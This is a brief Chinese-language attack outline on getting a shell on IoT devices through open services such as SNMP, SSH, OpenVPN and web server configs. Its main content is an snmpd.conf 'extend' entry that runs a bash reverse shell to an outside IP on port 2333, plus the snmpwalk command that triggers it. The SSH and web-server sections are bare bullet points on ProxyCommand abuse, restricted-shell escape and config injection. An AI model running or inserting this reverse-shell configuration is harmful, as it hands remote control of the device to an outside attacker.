### IOT设备通过开放的各种服务getshell

#### SNMP

##### NET-SNMP-EXTEND-MIB

```shell
# snmpd.conf

extend myUptime /bin/uptime
extend myDisk /bin/df -h
extend shell /bin/bash -i >& /dev/tcp/47.xxx.xxx.72/2333 0>&1 
```

```shell
# 遍历NET-SNMP-EXTEND-MIB节点下的对象
snmpwalk -v2c -c public 127.0.0.1 NET-SNMP-EXTEND-MIB::nsExtendObjects
```

##### DISMAN-SCRIPT-MIB

#### SSH

* 服务端公钥证书
* 客户端 -J -o ProxyCommand
* ssh admin@ip "command"
* 受限shell逃逸

#### openvpn

#### lighttpd/nginx

* 配置注入
